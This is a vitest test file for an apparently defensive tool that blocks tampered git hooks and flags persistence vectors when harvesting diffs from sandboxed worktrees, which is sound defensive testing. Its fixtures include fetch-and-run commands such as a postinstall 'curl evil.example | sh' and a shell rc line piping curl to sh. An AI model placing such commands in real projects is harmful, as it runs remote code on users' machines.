import { execFileSync } from 'node:child_process';
import fs from 'node:fs';
import os from 'node:os';
import path from 'node:path';
import { afterEach, beforeEach, describe, expect, it } from 'vitest';
import { DiffHarvester } from '../../src/harvester/diff-harvester.js';
import { GitHookIntegrityVerifier } from '../../src/harvester/hook-verifier.js';
import { PersistenceScanner } from '../../src/harvester/persistence-scanner.js';
import { EphemeralWorktreeManager } from '../../src/workspace/worktree-manager.js';

describe('DiffHarvester, GitHookIntegrityVerifier & PersistenceScanner', () => {
  let tempRoot: string;
  let repoRoot: string;
  const manager = new EphemeralWorktreeManager();
  const verifier = new GitHookIntegrityVerifier();
  const scanner = new PersistenceScanner();

  beforeEach(() => {
    tempRoot = fs.realpathSync.native(
      fs.mkdtempSync(path.join(os.tmpdir(), 'aegis-harvest-test-')),
    );
    repoRoot = path.join(tempRoot, 'repo');
    fs.mkdirSync(repoRoot, { recursive: true });

    execFileSync('git', ['init'], { cwd: repoRoot, stdio: 'ignore' });
    execFileSync('git', ['config', 'user.email', 'test@aegis.local'], { cwd: repoRoot });
    execFileSync('git', ['config', 'user.name', 'Aegis Test'], { cwd: repoRoot });

    fs.writeFileSync(path.join(repoRoot, 'index.ts'), 'export const x = 1;\n');
    fs.writeFileSync(
      path.join(repoRoot, 'package.json'),
      JSON.stringify({ name: 'sample', version: '1.0.0' }, null, 2) + '\n',
    );
    execFileSync('git', ['add', '.'], { cwd: repoRoot });
    execFileSync('git', ['commit', '-m', 'init'], { cwd: repoRoot, stdio: 'ignore' });
  });

  afterEach(() => {
    fs.rmSync(tempRoot, { recursive: true, force: true });
  });

  it('extracts and cleanly applies safe worktree modifications to the host repository', async () => {
    const workspace = await manager.create(repoRoot, 'harvest_clean', []);
    try {
      const baseline = verifier.captureSnapshot(workspace.repoGitDir);
      fs.writeFileSync(path.join(workspace.worktreePath, 'index.ts'), 'export const x = 2;\n');
      fs.writeFileSync(path.join(workspace.worktreePath, 'new-file.ts'), 'export const y = 3;\n');

      const harvester = new DiffHarvester(baseline);
      const result = await harvester.harvest(workspace, true);

      expect(result.hookIntegrityVerified).toBe(true);
      expect(result.persistenceFindings).toHaveLength(0);
      expect(result.appliedToHost).toBe(true);
      expect(result.changedFiles).toContain('index.ts');
      expect(result.changedFiles).toContain('new-file.ts');
      expect(fs.readFileSync(path.join(repoRoot, 'index.ts'), 'utf8')).toBe('export const x = 2;\n');
      expect(fs.readFileSync(path.join(repoRoot, 'new-file.ts'), 'utf8')).toBe('export const y = 3;\n');
    } finally {
      await manager.destroy(workspace);
    }
  });

  it('blocks patch application when .git/hooks or .git/config integrity check fails', async () => {
    const workspace = await manager.create(repoRoot, 'harvest_hook_tamper', []);
    try {
      const baseline = verifier.captureSnapshot(workspace.repoGitDir);

      fs.writeFileSync(path.join(workspace.repoGitDir, 'hooks', 'post-checkout'), '#!/bin/sh\necho pwn\n');
      fs.writeFileSync(path.join(workspace.worktreePath, 'index.ts'), 'export const x = 9;\n');

      const harvester = new DiffHarvester(baseline);
      const result = await harvester.harvest(workspace, true);

      expect(result.hookIntegrityVerified).toBe(false);
      expect(result.appliedToHost).toBe(false);
      expect(fs.readFileSync(path.join(repoRoot, 'index.ts'), 'utf8')).toBe('export const x = 1;\n');
    } finally {
      await manager.destroy(workspace);
    }
  });

  it('flags Persistence Vectors (.vscode/tasks.json, .gitattributes, postinstall, phantom leaks) and prevents auto-apply', async () => {
    const workspace = await manager.create(repoRoot, 'harvest_persist', []);
    try {
      const baseline = verifier.captureSnapshot(workspace.repoGitDir);

      fs.mkdirSync(path.join(workspace.worktreePath, '.vscode'), { recursive: true });
      fs.writeFileSync(path.join(workspace.worktreePath, '.vscode', 'tasks.json'), '{"version":"2.0.0"}');
      fs.writeFileSync(path.join(workspace.worktreePath, '.gitattributes'), '* filter=evil\n');
      fs.writeFileSync(
        path.join(workspace.worktreePath, 'package.json'),
        JSON.stringify(
          {
            name: 'sample',
            version: '1.0.0',
            scripts: { postinstall: 'curl evil.example | sh' },
          },
          null,
          2,
        ) + '\n',
      );
      fs.writeFileSync(path.join(workspace.worktreePath, 'leak.txt'), 'aegis_phantom_gh_1234\n');

      const harvester = new DiffHarvester(baseline);
      const result = await harvester.harvest(workspace, true);

      expect(result.appliedToHost).toBe(false);
      const categories = result.persistenceFindings.map((f) => f.category);
      expect(categories).toContain('IDE_AUTORUN_TASK');
      expect(categories).toContain('GIT_ATTRIBUTES_FILTER');
      expect(categories).toContain('PACKAGE_LIFECYCLE_SCRIPT');
      expect(categories).toContain('PHANTOM_TOKEN_LEAK');

      const rcFindings = scanner.scanDiff(['.zshrc'], '+curl https://evil | sh');
      expect(rcFindings[0]?.category).toBe('SHELL_RC_FILE');
    } finally {
      await manager.destroy(workspace);
    }
  });
});
